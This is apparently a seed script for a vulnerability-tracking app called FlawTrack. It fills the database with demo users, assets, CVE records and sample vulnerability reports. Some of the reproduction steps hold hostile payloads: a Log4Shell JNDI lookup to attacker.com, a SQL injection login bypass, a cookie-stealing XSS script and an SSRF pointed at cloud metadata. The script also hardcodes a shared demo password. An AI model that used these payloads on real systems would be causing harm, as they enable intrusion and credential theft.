const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const { connectDB, disconnectDB } = require('../src/config/database');
const User = require('../src/models/User');
const Asset = require('../src/models/Asset');
const Vulnerability = require('../src/models/Vulnerability');
const ThreatIntel = require('../src/models/ThreatIntel');
const Setting = require('../src/models/Setting');
const AuditLog = require('../src/models/AuditLog');
const Notification = require('../src/models/Notification');
const { ROLES, VULN_STATUSES, PRIORITIES, AUDIT_ACTIONS } = require('../src/config/constants');
const RiskEngineService = require('../src/services/riskEngine.service');
const SlaService = require('../src/services/sla.service');
const CvssService = require('../src/services/cvss.service');
const logger = require('../src/utils/logger');

async function seed(shouldDisconnect = true) {
  logger.info('Starting FlawTrack database seed...');
  if (mongoose.connection.readyState !== 1) {
    await connectDB();
  }

  // Clear existing collections (except settings)
  await Promise.all([
    User.deleteMany({}),
    Asset.deleteMany({}),
    Vulnerability.deleteMany({}),
    ThreatIntel.deleteMany({}),
    Notification.deleteMany({}),
  ]);

  // Direct collection drop for AuditLog to bypass Mongoose immutable hooks
  try {
    if (mongoose.connection.db) {
      await mongoose.connection.db.collection('auditlogs').drop();
    }
  } catch (err) {
    // Ignore if collection doesn't exist yet
  }

  // 1. Initialize Singleton Settings
  const settings = await Setting.getSettings();
  logger.info('Settings initialized with default weights and SLA hours.');

  // 2. Seed Users
  const defaultPassword = 'Password123!';
  const salt = await bcrypt.genSalt(10);
  const passwordHash = await bcrypt.hash(defaultPassword, salt);

  const users = await User.create([
    {
      name: 'Security Admin',
      email: 'admin@flawtrack.local',
      passwordHash,
      role: ROLES.ADMIN,
      team: 'SecOps Leadership',
      isActive: true,
      lastLoginAt: new Date(),
    },
    {
      name: 'Sarah Connor (Senior Analyst)',
      email: 'analyst1@flawtrack.local',
      passwordHash,
      role: ROLES.ANALYST,
      team: 'AppSec Engineering',
      isActive: true,
      lastLoginAt: new Date(Date.now() - 3600 * 1000),
    },
    {
      name: 'Dave Nelson (Lead Developer)',
      email: 'developer1@flawtrack.local',
      passwordHash,
      role: ROLES.DEVELOPER,
      team: 'Core Platform Engineering',
      isActive: true,
      lastLoginAt: new Date(Date.now() - 14400 * 1000),
    },
    {
      name: 'Alex Murphy (Security Analyst)',
      email: 'analyst2@flawtrack.local',
      passwordHash,
      role: ROLES.ANALYST,
      team: 'SOC & Triage',
      isActive: true,
      lastLoginAt: new Date(Date.now() - 7200 * 1000),
    },
    {
      name: 'Bob Miller (Security Researcher)',
      email: 'reporter1@flawtrack.local',
      passwordHash,
      role: ROLES.REPORTER,
      team: 'Red Team / Pentest',
      isActive: true,
      lastLoginAt: new Date(Date.now() - 86400 * 1000),
    },
  ]);

  const [admin, analyst1, developer1, analyst2, reporter1] = users;
  logger.info(`Seeded ${users.length} users with password: ${defaultPassword}`);

  // 3. Seed Assets (10 realistic assets)
  const assets = await Asset.create([
    {
      name: 'Core Banking API Gateway',
      type: 'api',
      environment: 'production',
      criticality: 5,
      internetFacing: true,
      dataSensitivity: 5,
      owner: 'Cloud Infrastructure Team',
      businessUnit: 'Core Banking',
      description: 'Primary customer-facing REST/GraphQL API gateway handling transactions.',
    },
    {
      name: 'Customer Portal Web App',
      type: 'web-app',
      environment: 'production',
      criticality: 4,
      internetFacing: true,
      dataSensitivity: 4,
      owner: 'Digital Banking Squad',
      businessUnit: 'Retail Banking',
      description: 'Single page web application serving retail customers.',
    },
    {
      name: 'Internal Analytics Database Cluster',
      type: 'database',
      environment: 'production',
      criticality: 4,
      internetFacing: false,
      dataSensitivity: 5,
      owner: 'Data Engineering',
      businessUnit: 'Business Intelligence',
      description: 'PostgreSQL & ClickHouse data warehouse storing customer telemetry.',
    },
    {
      name: 'Payment Processing Microservice',
      type: 'server',
      environment: 'production',
      criticality: 5,
      internetFacing: false,
      dataSensitivity: 5,
      owner: 'Fintech Payments Team',
      businessUnit: 'Payments',
      description: 'Isolated backend service interfacing with Visa/Mastercard networks.',
    },
    {
      name: 'Staging E-Commerce Store',
      type: 'web-app',
      environment: 'staging',
      criticality: 3,
      internetFacing: true,
      dataSensitivity: 3,
      owner: 'E-Commerce Guild',
      businessUnit: 'Merchant Services',
      description: 'Pre-production staging cluster mirroring store environment.',
    },
    {
      name: 'Corporate Edge VPN Gateway',
      type: 'network-device',
      environment: 'production',
      criticality: 4,
      internetFacing: true,
      dataSensitivity: 4,
      owner: 'NetOps Team',
      businessUnit: 'Enterprise IT',
      description: 'GlobalProtect remote access gateway for enterprise staff.',
    },
    {
      name: 'Developer Sandbox Host',
      type: 'server',
      environment: 'development',
      criticality: 2,
      internetFacing: false,
      dataSensitivity: 2,
      owner: 'DevOps Enablement',
      businessUnit: 'Platform Engineering',
      description: 'Shared developer testing machine for ephemeral workloads.',
    },
    {
      name: 'Isolated Security Lab Test Server',
      type: 'server',
      environment: 'test',
      criticality: 1,
      internetFacing: false,
      dataSensitivity: 1,
      owner: 'Red Team',
      businessUnit: 'Cybersecurity',
      description: 'Fully isolated virtual machine for exploit reproduction and PoC verification.',
    },
    {
      name: 'Corporate HR Portal',
      type: 'web-app',
      environment: 'production',
      criticality: 3,
      internetFacing: false,
      dataSensitivity: 4,
      owner: 'Internal Systems',
      businessUnit: 'Human Resources',
      description: 'Intranet employee management and payroll review dashboard.',
    },
    {
      name: 'Legacy Active Directory Domain Controller',
      type: 'server',
      environment: 'production',
      criticality: 5,
      internetFacing: false,
      dataSensitivity: 5,
      owner: 'Identity & Access Management',
      businessUnit: 'Enterprise IT',
      description: 'Primary domain controller serving enterprise Kerberos & LDAP authentication.',
    },
  ]);
  logger.info(`Seeded ${assets.length} infrastructure assets.`);

  // 4. Seed Threat Intelligence Cache
  await ThreatIntel.create([
    {
      cveId: 'CVE-2021-44228',
      epss: 0.9754,
      percentile: 0.9998,
      inKev: true,
      kevDateAdded: new Date('2021-12-10'),
      kevRequiredAction: 'Upgrade log4j to version 2.17.1 or higher.',
      cvssBaseScore: 10.0,
      cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
      source: 'offline_snapshot',
    },
    {
      cveId: 'CVE-2023-34362',
      epss: 0.9621,
      percentile: 0.9989,
      inKev: true,
      kevDateAdded: new Date('2023-06-02'),
      kevRequiredAction: 'Apply vendor mitigation patch immediately.',
      cvssBaseScore: 9.8,
      cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
      source: 'offline_snapshot',
    },
    {
      cveId: 'CVE-2024-3400',
      epss: 0.9412,
      percentile: 0.9975,
      inKev: true,
      kevDateAdded: new Date('2024-04-12'),
      kevRequiredAction: 'Apply PAN-OS hotfix.',
      cvssBaseScore: 10.0,
      cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
      source: 'offline_snapshot',
    },
    {
      cveId: 'CVE-2023-22515',
      epss: 0.954,
      percentile: 0.9981,
      inKev: true,
      kevDateAdded: new Date('2023-10-05'),
      cvssBaseScore: 9.8,
      source: 'offline_snapshot',
    },
  ]);
  logger.info('Seeded ThreatIntel cache with high-priority CISA KEV CVEs.');

  // Helper date generator for historical timestamps
  const daysAgo = (days) => new Date(Date.now() - days * 24 * 3600 * 1000);

  // 5. Seed 30 Vulnerabilities across all 13 stages, priorities, and test cases
  const vulnTemplates = [
    // 1. KEV Critical P1 on Core Banking (Active, Assigned)
    {
      title: 'Apache Log4j Remote Code Execution (Log4Shell) in Payment Header',
      description: 'An unauthenticated remote attacker can execute arbitrary code by passing a malformed JNDI lookup string in HTTP headers.',
      stepsToReproduce: '1. Send curl with header "X-Api-Version: ${jndi:ldap://attacker.com/exploit}". 2. Observe outbound LDAP lookup.',
      impactDescription: 'Complete takeover of Core Banking API Gateway host.',
      category: 'RCE',
      cveId: 'CVE-2021-44228',
      cweId: 'CWE-502',
      discoverySource: 'burp',
      asset: assets[0]._id, // Core Banking API Gateway (Prod, Criticality 5)
      reportedBy: reporter1._id,
      assignedTo: analyst1._id,
      status: VULN_STATUSES.IN_PROGRESS,
      cvss: {
        vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
        baseScore: 10.0,
        severity: 'Critical',
      },
      threat: { epss: 0.9754, inKev: true, kevDateAdded: new Date('2021-12-10') },
      affectedUsersCount: 50000,
      internetFacing: true,
      remediationNotes: [
        { by: analyst1._id, at: daysAgo(1), note: 'Applied hotpatch JVM flag -Dlog4j2.formatMsgNoLookups=true while compiling 2.17.1 update.' },
      ],
      createdAt: daysAgo(2),
    },

    // 2. High EPSS & KEV SQLi on Customer Portal (P1 SLA Breached!)
    {
      title: 'MOVEit SQL Injection Vulnerability in File Transfer Subsystem',
      description: 'Critical SQL injection in file upload handler allows database extraction and arbitrary code execution.',
      stepsToReproduce: 'Send crafted HTTP POST request with SQL payload in payload headers.',
      impactDescription: 'Customer database dump containing PII and hashed passwords.',
      category: 'SQL Injection',
      cveId: 'CVE-2023-34362',
      cweId: 'CWE-89',
      discoverySource: 'nessus',
      asset: assets[1]._id,
      reportedBy: reporter1._id,
      assignedTo: analyst2._id,
      status: VULN_STATUSES.ASSIGNED,
      cvss: { baseScore: 9.8, severity: 'Critical' },
      threat: { epss: 0.9621, inKev: true },
      affectedUsersCount: 25000,
      internetFacing: true,
      sla: {
        dueAt: daysAgo(1), // Breached 24 hours ago!
        hoursAllowed: 24,
        warningSent: true,
        breached: true,
        breachedAt: daysAgo(1),
      },
      createdAt: daysAgo(3),
    },

    // 3. Near-Duplicate Pair 1 (Original)
    {
      title: 'SQL Injection in User Login Parameter',
      description: 'Attacker can inject SQL statements via the username input field on the authentication portal leading to authentication bypass.',
      stepsToReproduce: '1. Navigate to /login. 2. Enter admin" OR 1=1-- in username. 3. Observe successful session generation.',
      impactDescription: 'Administrative account takeover without valid password.',
      category: 'SQL Injection',
      cweId: 'CWE-89',
      discoverySource: 'manual',
      asset: assets[1]._id,
      reportedBy: reporter1._id,
      assignedTo: analyst1._id,
      status: VULN_STATUSES.IN_PROGRESS,
      cvss: { baseScore: 8.8, severity: 'High' },
      threat: { epss: 0.45, inKev: false },
      affectedUsersCount: 15000,
      internetFacing: true,
      createdAt: daysAgo(5),
    },

    // 4. Near-Duplicate Pair 2 (Reported later, Flagged as Potential Duplicate)
    {
      title: 'SQL Injection in User Login Parameter',
      description: 'SQL vulnerability allows SQL injection on login screen via username input parameter leading to auth bypass.',
      stepsToReproduce: '1. Go to /login. 2. Put admin" OR 1=1 in username. 3. Submit request.',
      impactDescription: 'Unauthorized access to user accounts.',
      category: 'SQL Injection',
      cweId: 'CWE-89',
      discoverySource: 'manual',
      asset: assets[1]._id,
      reportedBy: reporter1._id,
      status: VULN_STATUSES.SUBMITTED,
      duplicate: {
        isPotentialDuplicate: true,
        matches: [{ similarity: 0.88, title: 'SQL Injection in User Login Parameter' }],
        resolution: 'none',
      },
      createdAt: daysAgo(1),
    },

    // 5. Reopened Vulnerability (Failed Re-test Demo)
    {
      title: 'Broken Object Level Authorization (IDOR) on Transaction History',
      description: 'Changing transaction_id parameter in GET /api/v1/transactions/:id allows viewing any account statement.',
      stepsToReproduce: 'Authenticate as User A, request /api/v1/transactions/98234 (owned by User B).',
      impactDescription: 'Confidentiality breach of all banking customers transactions.',
      category: 'IDOR',
      cweId: 'CWE-639',
      discoverySource: 'burp',
      asset: assets[0]._id,
      reportedBy: reporter1._id,
      assignedTo: analyst1._id,
      status: VULN_STATUSES.ASSIGNED,
      cvss: { baseScore: 7.5, severity: 'High' },
      reopenCount: 1,
      retest: {
        result: 'fail',
        notes: 'Verification failed: API still returns 200 OK with User B transaction details when requesting via direct ID.',
        by: analyst1._id,
        at: daysAgo(1),
        attempts: 1,
      },
      remediationNotes: [
        { by: analyst1._id, at: daysAgo(3), note: 'Developer added session check.' },
        { by: analyst1._id, at: daysAgo(1), note: 'Reopened: Session check verified login, but failed to assert tenant ownership.' },
      ],
      createdAt: daysAgo(6),
    },

    // 6. Same Flaw on an Isolated Test Server (Yields lower priority P3/P4)
    {
      title: 'Apache Log4j JNDI Lookup in Isolated Security Lab Test Server',
      description: 'Log4shell vulnerability present on isolated test server inside the sandbox security environment.',
      stepsToReproduce: 'Trigger lookup against test port 8080.',
      impactDescription: 'Testing environment only, zero production data access.',
      category: 'RCE',
      cveId: 'CVE-2021-44228',
      discoverySource: 'manual',
      asset: assets[7]._id, // Isolated Security Lab Server (Test, Criticality 1)
      reportedBy: reporter1._id,
      status: VULN_STATUSES.PRIORITIZED,
      cvss: { baseScore: 10.0, severity: 'Critical' },
      threat: { epss: 0.9754, inKev: true },
      affectedUsersCount: 1,
      internetFacing: false,
      createdAt: daysAgo(4),
    },

    // 7. Closed & Verified Happy Path Report
    {
      title: 'Cross-Site Scripting (Reflected) in Search Query Parameter',
      description: 'The search field on the customer portal reflected unsanitized HTML payloads.',
      stepsToReproduce: 'Query /search?q=<script>alert(document.cookie)</script>',
      impactDescription: 'Session hijacking of portal users.',
      category: 'XSS',
      cweId: 'CWE-79',
      discoverySource: 'burp',
      asset: assets[1]._id,
      reportedBy: reporter1._id,
      assignedTo: analyst2._id,
      status: VULN_STATUSES.CLOSED,
      cvss: { baseScore: 6.1, severity: 'Medium' },
      threat: { epss: 0.15, inKev: false },
      resolvedAt: daysAgo(7),
      closedAt: daysAgo(6),
      retest: {
        result: 'pass',
        notes: 'Verified HTML encoding is active across all browser contexts.',
        by: analyst2._id,
        at: daysAgo(6),
        attempts: 1,
      },
      createdAt: daysAgo(14),
    },

    // 8. Needs Info status report
    {
      title: 'Potential Server-Side Request Forgery in Webhook Integration',
      description: 'Specifying 169.254.169.254 in webhook target allegedly triggers AWS metadata query.',
      stepsToReproduce: 'Submit internal IP in webhook form.',
      impactDescription: 'Cloud IAM credential exfiltration.',
      category: 'SSRF',
      cweId: 'CWE-918',
      discoverySource: 'manual',
      asset: assets[0]._id,
      reportedBy: reporter1._id,
      status: VULN_STATUSES.NEEDS_INFO,
      validation: {
        result: 'needs_info',
        notes: 'Could you please provide the specific header or proof of response body received from metadata service?',
        validatedBy: analyst1._id,
        validatedAt: daysAgo(1),
      },
      createdAt: daysAgo(2),
    },

    // 9. Rejected Report
    {
      title: 'Missing HTTP Strict-Transport-Security on Internal Staging',
      description: 'Staging environment missing HSTS response header.',
      stepsToReproduce: 'Inspect curl response headers.',
      impactDescription: 'Informational',
      category: 'Misconfiguration',
      discoverySource: 'nmap',
      asset: assets[4]._id,
      reportedBy: reporter1._id,
      status: VULN_STATUSES.REJECTED,
      validation: {
        result: 'invalid',
        notes: 'Internal staging environment does not require HSTS per current organizational policy.',
        validatedBy: analyst2._id,
        validatedAt: daysAgo(5),
      },
      createdAt: daysAgo(7),
    },

    // 10. Palo Alto GlobalProtect Command Injection (P1)
    {
      title: 'Palo Alto Networks PAN-OS GlobalProtect Command Injection',
      description: 'Unauthenticated command injection in GlobalProtect feature allowing root execution.',
      stepsToReproduce: 'Submit crafted session ID to GlobalProtect gateway portal.',
      impactDescription: 'Root compromise of corporate edge VPN.',
      category: 'RCE',
      cveId: 'CVE-2024-3400',
      discoverySource: 'openvas',
      asset: assets[5]._id, // Corporate Edge VPN Gateway
      reportedBy: reporter1._id,
      assignedTo: analyst1._id,
      status: VULN_STATUSES.IN_PROGRESS,
      cvss: { baseScore: 10.0, severity: 'Critical' },
      threat: { epss: 0.9412, inKev: true },
      affectedUsersCount: 8000,
      internetFacing: true,
      createdAt: daysAgo(8),
    },
  ];

  // Generate 15 additional realistic historical vulnerabilities to populate charts
  const additionalCategories = ['SQL Injection', 'XSS', 'Auth Bypass', 'CSRF', 'Misconfiguration', 'Info Disclosure'];
  for (let i = 1; i <= 16; i++) {
    const isClosed = i % 2 === 0;
    const cat = additionalCategories[i % additionalCategories.length];
    const assetIdx = i % assets.length;
    const days = 10 + i * 2;

    vulnTemplates.push({
      title: `${cat} finding on ${assets[assetIdx].name} (Sprint ${Math.floor(i / 2) + 1})`,
      description: `Automated and manual audit detected ${cat} issue in API endpoints.`,
      stepsToReproduce: `Execute test harness against ${assets[assetIdx].name}.`,
      impactDescription: 'Moderate security risk to application confidentiality and integrity.',
      category: cat,
      discoverySource: i % 3 === 0 ? 'burp' : i % 3 === 1 ? 'nessus' : 'manual',
      asset: assets[assetIdx]._id,
      reportedBy: reporter1._id,
      assignedTo: i % 2 === 0 ? analyst1._id : analyst2._id,
      status: isClosed ? VULN_STATUSES.CLOSED : VULN_STATUSES.ASSIGNED,
      cvss: { baseScore: 4.0 + (i % 5) * 1.2, severity: i % 2 === 0 ? 'Medium' : 'High' },
      threat: { epss: 0.05 + (i % 10) * 0.04, inKev: false },
      affectedUsersCount: 100 * i,
      internetFacing: assets[assetIdx].internetFacing,
      resolvedAt: isClosed ? daysAgo(days - 3) : null,
      closedAt: isClosed ? daysAgo(days - 2) : null,
      createdAt: daysAgo(days),
    });
  }

  // Calculate risk and SLA for each seeded vulnerability
  const createdVulns = [];
  for (const t of vulnTemplates) {
    const v = new Vulnerability(t);
    const assetDoc = assets.find((a) => a._id.equals(v.asset));

    // Calculate Risk
    const riskResult = await RiskEngineService.calculateRisk(v, assetDoc, settings);
    v.risk = {
      score: riskResult.score,
      priority: riskResult.priority,
      breakdown: riskResult.breakdown,
      explanation: riskResult.explanation,
      calculatedAt: new Date(),
    };

    // Calculate SLA if not pre-seeded
    if (!v.sla?.dueAt && v.risk.priority) {
      const slaDetails = await SlaService.computeSla(v.risk.priority, v.createdAt || new Date(), settings);
      v.sla = slaDetails;
    }

    await v.save();
    createdVulns.push(v);
  }

  logger.info(`Successfully seeded ${createdVulns.length} vulnerabilities across all statuses and priorities.`);

  // 6. Seed In-app Notifications
  await Notification.create([
    {
      user: analyst1._id,
      type: 'SLA_WARNING',
      message: 'Warning: SLA for "MOVEit SQL Injection Vulnerability" is 75% elapsed.',
      vulnerability: createdVulns[1]._id,
      read: false,
    },
    {
      user: analyst2._id,
      type: 'ASSIGNED',
      message: 'You have been assigned to "Palo Alto Networks PAN-OS Command Injection".',
      vulnerability: createdVulns[9]._id,
      read: false,
    },
    {
      user: reporter1._id,
      type: 'NEEDS_INFO',
      message: 'Validation update for "Potential Server-Side Request Forgery": NEEDS INFO requested.',
      vulnerability: createdVulns[7]._id,
      read: true,
    },
  ]);
  logger.info('Seeded in-app notifications.');

  // 7. Seed Sample Audit Trail Entries
  const rawAuditEntries = [
    {
      actor: reporter1._id,
      actorRole: ROLES.REPORTER,
      action: AUDIT_ACTIONS.VULN_CREATED,
      entityType: 'Vulnerability',
      entityId: createdVulns[0]._id,
      after: { title: createdVulns[0].title },
      ip: '192.168.1.100',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      timestamp: daysAgo(2),
    },
    {
      actor: analyst1._id,
      actorRole: ROLES.ANALYST,
      action: AUDIT_ACTIONS.VALIDATED,
      entityType: 'Vulnerability',
      entityId: createdVulns[0]._id,
      after: { status: 'VALIDATED', result: 'valid' },
      ip: '192.168.1.101',
      userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      timestamp: daysAgo(2),
    },
    {
      actor: analyst1._id,
      actorRole: ROLES.ANALYST,
      action: AUDIT_ACTIONS.RISK_RECALCULATED,
      entityType: 'Vulnerability',
      entityId: createdVulns[0]._id,
      after: { priority: 'P1', score: createdVulns[0].risk.score },
      ip: '192.168.1.101',
      userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      timestamp: daysAgo(2),
    },
    {
      actor: null,
      actorRole: 'SYSTEM',
      action: AUDIT_ACTIONS.SLA_BREACHED,
      entityType: 'Vulnerability',
      entityId: createdVulns[1]._id,
      after: { priority: 'P1', dueAt: createdVulns[1].sla.dueAt },
      ip: '127.0.0.1',
      userAgent: 'FlawTrack Cron SLA Monitor',
      timestamp: daysAgo(1),
    },
  ];

  await mongoose.connection.collection('auditlogs').insertMany(rawAuditEntries);
  logger.info('Seeded immutable audit log entries.');

  logger.info('========================================================');
  logger.info('FlawTrack Database Seeding Completed Successfully!');
  logger.info('Available Credentials:');
  logger.info('  Admin:     admin@flawtrack.local      / Password123!');
  logger.info('  Analyst:   analyst1@flawtrack.local   / Password123!');
  logger.info('  Developer: developer1@flawtrack.local  / Password123!');
  logger.info('  Reporter:  reporter1@flawtrack.local  / Password123!');
  logger.info('========================================================');

  if (shouldDisconnect) {
    await disconnectDB();
  }
}

if (require.main === module) {
  seed()
    .then(() => process.exit(0))
    .catch((err) => {
      console.error('Seed script error:', err);
      process.exit(1);
    });
}

module.exports = seed;
